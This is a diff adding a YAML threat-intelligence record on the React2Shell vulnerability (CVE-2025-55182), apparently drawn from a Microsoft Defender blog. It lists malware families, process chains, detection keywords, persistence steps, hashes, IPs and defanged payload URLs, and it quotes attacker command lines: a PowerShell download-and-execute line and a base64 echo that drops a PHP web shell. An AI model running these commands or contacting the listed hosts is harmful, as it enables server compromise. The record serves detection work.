@@ -1,0 +1,121 @@
+description: CVE-2025-55182 (React2Shell) is a pre-authentication RCE vulnerability
+  affecting React Server Components, Next.js, and related frameworks. Attackers exploit
+  this to execute arbitrary code, deploy coin miners, and perform lateral movement.
+malware_families:
+- VShell
+- EtherRAT
+- SNOWLIGHT
+- ShadowPAD
+- XMRig
+TTPs:
+  processes:
+  - node.exe
+  - cmd.exe
+  - powershell.exe
+  - powershell
+  commandline:
+  - /bin/sh -c (whoami)
+  - powershell -c "iex (iwr http://*.trycloudflare.com/).content"
+  powershell:
+  - Invoke-Expression
+  - DownloadString
+  - DownloadFile
+  - FromBase64String
+  - Start-Process
+  - System.IO.Compression
+  - System.IO.MemoryStream
+  - 'iex '
+  - iex(
+  - Invoke-WebRequest
+  - 'iwr '
+  - .UploadFile
+  - System.Net.WebClient
+  - echo\"PD9waHAgQGV2YWwoIFIQTINUWydrc3hubWFrbndmYXgnXSk7Pz4=\" | basee4 -d |dd of=/usr/share/zabbix/ui/IQlvU.php
+    status=none
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - node -> *.trycloudflare.com
+  - powershell -> *.anondns.net
+  - bash -> *.aws.amazon.com
+  - 194.69.203.32:81
+  - 162.215.170.26:3000
+  - 216.158.232.43:12000
+  file_activity:
+  - /tmp/*
+  - /dev/tcp/*
+  persistence:
+  - added new malicious users
+  - utilized MeshAgent
+  - modified authorized_keys file
+  - enabled root login
+  process_relations:
+  - node.exe -> cmd.exe
+  - node.exe -> powershell.exe
+  - node.exe->cmd.exe
+  - next-server->powershell
+CVEs:
+- CVE-2025-55182
+- CVE-2025-66478
+IOCs:
+  hashes:
+  - c2867570f3bbb71102373a94c7153239599478af84b9c81f2a0368de36f14a7c
+  - 9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df717c849a1331
+  - b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d27909046e5e0f
+  - d60461b721c0ef7cfe5899f76672e4970d629bb51bb904a053987e0a0c48ee0f
+  - d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8f0b66629fe8a
+  - d71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b59630d8f3b4d
+  - b5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc870082335954bec8
+  - 4cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0df0d3d5668a4d
+  - f347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf317e10c4068b
+  - 661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e0aad73947fb1
+  - 876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a9dde35ba8e13
+  - 2ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083240afa3a6457
+  - f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b8e07beb854f7
+  - 7e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f244bf271d2e5
+  ip_addresses:
+  - 194.69.203.32
+  - 162.215.170.26
+  - 216.158.232.43
+  - 196.251.100.191
+  - 46.36.37.85
+  - 92.246.87.48
+  domains:
+  - anywherehost.site
+  - xpertclient.net
+  - superminecraft.net.br
+  - overcome-pmc-conferencing-books.trycloudflare.com
+  - donaldjtrmp.anondns.net
+  - labubu.anondns.net
+  - krebsec.anondns.net
+  - hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com
+  - ghostbin.axel.org
+  urls:
+  - http://*.trycloudflare.com/
+  - http://*.anondns.net/
+  - hxxp://194.69.203.32:81/hiddenbink/colonna.arc
+  - hxxp://194.69.203.32:81/hiddenbink/colonna.i686
+  - hxxp://194.69.203.32:81/hiddenbink/react.sh
+  - hxxp://162.215.170.26:3000/sex.sh
+  - hxxp://216.158.232.43:12000/sex.sh
+  - hxxp://196.251.100.191/no_killer/Exodus.arm4
+  - hxxp://196.251.100.191/no_killer/Exodus.x86
+  - hxxp://196.251.100.191/no_killer/Exodus.x86_64
+  - hxxp://196.251.100.191/update.sh
+  - hxxp://anywherehost.site/xms/k1.sh
+  - hxxp://anywherehost.site/xms/kill2.sh
+  - hxxps://overcome-pmc-conferencing-books.trycloudflare.com/p.png
+  - hxxp://donaldjtrmp.anondns.net:1488/labubu
+  - hxxp://labubu.anondns.net:1488/dong
+  - hxxp://krebsec.anondns.net:2316/dong
+  - hxxps://hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com/agent
+  - hxxps://ghostbin.axel.org/paste/evwgo/raw
+  - hxxp://xpertclient.net:3000/sex.sh
+  - hxxp://superminecraft.net.br:3000/sex.sh
+authors:
+- Microsoft Defender researchers
+- John Lambert
+reference: https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components
+date_of_publication: December 15, 2025
+file_creation_date: December 15, 2025
